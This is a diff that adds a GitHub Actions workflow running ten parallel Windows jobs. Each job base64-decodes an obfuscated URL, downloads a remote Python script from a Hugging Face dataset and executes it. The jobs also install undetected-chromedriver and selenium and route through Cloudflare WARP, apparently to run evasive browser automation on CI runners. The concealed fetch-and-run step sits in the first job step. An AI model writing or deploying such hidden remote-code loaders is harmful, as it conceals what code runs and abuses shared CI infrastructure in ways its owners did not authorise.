@@ -1,0 +1,70 @@
+name: Distributed Task Controller
+
+on:
+  repository_dispatch:
+    types: [run-task]
+  workflow_dispatch:
+
+concurrency:
+  group: job-queue-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  execute-nodes:
+    name: "Runner-Node-${{ matrix.worker_id }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        worker_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+
+    steps:
+      - name: Prepare Environment & Download Assets
+        shell: bash
+        run: |
+          echo "--> [START] Provisioning node ${{ matrix.worker_id }}..."
+          
+          # فك تشفير رابط المصدر وتنزيل الملف المطلوب
+          SOURCE_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2NhY2EvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 -d)
+          
+          curl -sL "$SOURCE_URL" -o runner_script.py
+          
+          echo "--> [DEPS] Installing required Python dependencies..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "--> [READY] Dependencies loaded successfully."
+
+      - name: Run Process with Timeout Guard
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Output "=== Starting workload on worker ${{ matrix.worker_id }} ==="
+          
+          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $procConfig = @{
+              FilePath     = "python"
+              ArgumentList = "runner_script.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $taskProcess = Start-Process @procConfig
+          
+          Write-Output "=== Monitoring execution. Maximum window set to 74 minutes ==="
+          
+          try {
+              Wait-Process -InputObject $taskProcess -Timeout 4440 -ErrorAction Stop
+              Write-Output "=== Execution completed smoothly within the allotted time. ==="
+          }
+          catch {
+              Write-Output "=== Maximum runtime limit reached! Terminating process... ==="
+              Stop-Process -InputObject $taskProcess -Force
+              Write-Output "=== Process killed successfully. ==="
+          }
+
+      - name: Finalize Task
+        shell: bash
+        run: echo "--> [FINISHED] Node ${{ matrix.worker_id }} completed its assigned cycle."
